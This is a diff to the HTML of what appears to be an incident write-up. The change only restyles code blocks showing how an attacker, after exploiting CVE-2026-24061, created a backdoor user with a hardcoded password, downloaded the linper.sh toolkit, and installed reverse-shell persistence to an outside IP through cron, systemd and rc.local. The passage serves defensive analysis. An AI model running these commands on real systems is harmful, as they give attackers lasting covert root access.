@@ -998,34 +998,34 @@ CVE-2026-24061 and obtained root access without credentials.</p>
 </h3>
 <p>After gaining root, the attacker created a backdoor user with a hardcoded
 password:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="go">sudo useradd -m -s /bin/bash cleanupsvc
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">echo &#34;cleanupsvc:YouKnowWhoiam69&#34; | sudo chpasswd
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>sudo useradd -m -s /bin/bash cleanupsvc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>echo &#34;cleanupsvc:YouKnowWhoiam69&#34; | sudo chpasswd
+</span></span></code></pre></div></div>
 <p>The persistence toolkit <code>linper.sh</code> was then downloaded from GitHub:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="go">wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
+</span></span></code></pre></div></div>
 <p><code>linper.sh</code> installed reverse shell callbacks using <code>awk</code>, <code>bash</code>, <code>nc</code>,
 <code>perl</code>, <code>pwsh</code>, <code>python3</code>, and <code>telnet</code> across multiple persistence
 locations targeting <code>91.99.25.54</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="go">bash linper.sh --enum-defenses 91.99.25.54
-</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">Persistence Installed: awk using /var/spool/cron/crontabs/root
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">Persistence Installed: awk using /etc/crontab
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">Persistence Installed: awk using /etc/cron.d/
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">Persistence Installed: awk using /etc/systemd/
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">-----------------------
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">Persistence Installed: bash using /var/spool/cron/crontabs/root
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">Persistence Installed: bash using /etc/crontab
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">Persistence Installed: bash using /etc/cron.d/
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">Persistence Installed: bash using /etc/systemd/
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">Persistence Installed: bash using /etc/rc.local
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">...[snip]...
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>bash linper.sh --enum-defenses 91.99.25.54
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>Persistence Installed: awk using /var/spool/cron/crontabs/root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Persistence Installed: awk using /etc/crontab
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>Persistence Installed: awk using /etc/cron.d/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>Persistence Installed: awk using /etc/systemd/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>-----------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>Persistence Installed: bash using /var/spool/cron/crontabs/root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>Persistence Installed: bash using /etc/crontab
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>Persistence Installed: bash using /etc/cron.d/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>Persistence Installed: bash using /etc/systemd/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>Persistence Installed: bash using /etc/rc.local
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>...[snip]...
+</span></span></code></pre></div></div>
 <p>Persistence locations written:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">/var/spool/cron/crontabs/root
-</span></span><span class="line"><span class="ln">2</span><span class="cl">/etc/crontab
-</span></span><span class="line"><span class="ln">3</span><span class="cl">/etc/cron.d/
-</span></span><span class="line"><span class="ln">4</span><span class="cl">/etc/systemd/
-</span></span><span class="line"><span class="ln">5</span><span class="cl">/etc/rc.local</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>/var/spool/cron/crontabs/root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>/etc/crontab
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>/etc/cron.d/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>/etc/systemd/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>/etc/rc.local</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Exfiltration</span>
     <div id="exfiltration" class="anchor"></div>
